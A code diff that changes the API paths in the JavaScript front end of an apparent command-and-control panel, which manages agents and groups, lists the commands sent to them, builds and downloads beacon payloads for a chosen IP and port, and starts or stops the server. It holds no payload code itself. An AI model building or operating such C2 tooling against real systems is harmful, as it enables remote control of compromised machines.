@@ -69,12 +69,12 @@ const app = {
     bindLogout() {
         document.getElementById('logoutBtn').addEventListener('click', async (e) => {
             e.preventDefault();
-            await fetch('/c2/api/auth.php', {
+            await fetch('api/auth.php', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({ action: 'logout' })
             });
-            window.location.href = '/c2/logout.php';
+            window.location.href = 'logout.php';
         });
     },
 
@@ -245,7 +245,7 @@ const app = {
         document.getElementById('createGroupForm').addEventListener('submit', async (e) => {
             e.preventDefault();
             const formData = new FormData(e.target);
-            await fetch('/c2/api/groups.php', {
+            await fetch('api/groups.php', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({
@@ -326,7 +326,7 @@ const app = {
 
     async loadAgents() {
         try {
-            const res = await fetch('/c2/api/agents.php?action=list');
+            const res = await fetch('api/agents.php?action=list');
             const data = await res.json();
             this.agents = data.agents || [];
             this.updateUI();
@@ -335,7 +335,7 @@ const app = {
 
     async loadGroups() {
         try {
-            const res = await fetch('/c2/api/groups.php?action=list');
+            const res = await fetch('api/groups.php?action=list');
             const data = await res.json();
             this.groups = data.groups || [];
             this.renderGroups();
@@ -352,7 +352,7 @@ const app = {
         document.getElementById('groupCount').textContent = this.groups.length;
 
         try {
-            const res = await fetch('/c2/api/commands.php?action=list&limit=1000');
+            const res = await fetch('api/commands.php?action=list&limit=1000');
             const data = await res.json();
             document.getElementById('commandCount').textContent = data.commands?.length || 0;
         } catch (e) { }
@@ -518,7 +518,7 @@ const app = {
 
     async updateAgentGroup(agentId) {
         const groupId = document.getElementById('agentGroupSelect').value;
-        await fetch('/c2/api/agents.php', {
+        await fetch('api/agents.php', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({
@@ -534,7 +534,7 @@ const app = {
 
     async deleteAgent(agentId) {
         if (!confirm('Delete this agent?')) return;
-        await fetch('/c2/api/agents.php', {
+        await fetch('api/agents.php', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({
@@ -548,7 +548,7 @@ const app = {
 
     async deleteGroup(groupId) {
         if (!confirm('Delete this group?')) return;
-        await fetch('/c2/api/groups.php', {
+        await fetch('api/groups.php', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({
@@ -669,7 +669,7 @@ const app = {
     },
 
     async addAgentToSelectedGroup(agentId) {
-        await fetch('/c2/api/agents.php', {
+        await fetch('api/agents.php', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({
@@ -684,7 +684,7 @@ const app = {
     },
 
     async removeAgentFromGroup(agentId) {
-        await fetch('/c2/api/agents.php', {
+        await fetch('api/agents.php', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({
@@ -734,7 +734,7 @@ const app = {
         status.innerHTML = '<div class="status-building"><span class="spinner-big"></span></div>';
 
         try {
-            const res = await fetch('/c2/api/payload.php?action=build', {
+            const res = await fetch('api/payload.php?action=build', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({ ip, port })
@@ -757,7 +757,7 @@ const app = {
 
     async loadBeacons() {
         try {
-            const res = await fetch('/c2/api/payload.php?action=list');
+            const res = await fetch('api/payload.php?action=list');
             const data = await res.json();
             const container = document.getElementById('beaconList');
 
@@ -791,13 +791,13 @@ const app = {
     },
 
     downloadBeacon(name) {
-        window.location.href = '/c2/api/payload.php?action=download&name=' + encodeURIComponent(name);
+        window.location.href = 'api/payload.php?action=download&name=' + encodeURIComponent(name);
     },
 
     async deleteBeacon(name) {
         if (!confirm('Delete ' + name + '?')) return;
         try {
-            await fetch('/c2/api/payload.php', {
+            await fetch('api/payload.php', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({ action: 'delete', name: name })
@@ -822,7 +822,7 @@ const app = {
     // Server Control Functions
     async checkServerStatus() {
         try {
-            const response = await fetch('/c2/api/server.php?action=status');
+            const response = await fetch('api/server.php?action=status');
             const data = await response.json();
             this.updateServerUI(data.running);
         } catch (e) {
@@ -876,7 +876,7 @@ const app = {
     async startServer() {
         this.setServerLoading(true);
         try {
-            const response = await fetch('/c2/api/server.php?action=start');
+            const response = await fetch('api/server.php?action=start');
             const data = await response.json();
 
             if (data.success) {
@@ -900,7 +900,7 @@ const app = {
     async stopServer() {
         this.setServerLoading(true);
         try {
-            const response = await fetch('/c2/api/server.php?action=stop');
+            const response = await fetch('api/server.php?action=stop');
             const data = await response.json();
 
             if (data.success) {
@@ -918,7 +918,7 @@ const app = {
     async restartServer() {
         this.setServerLoading(true);
         try {
-            const response = await fetch('/c2/api/server.php?action=restart');
+            const response = await fetch('api/server.php?action=restart');
             const data = await response.json();
 
             if (data.success) {
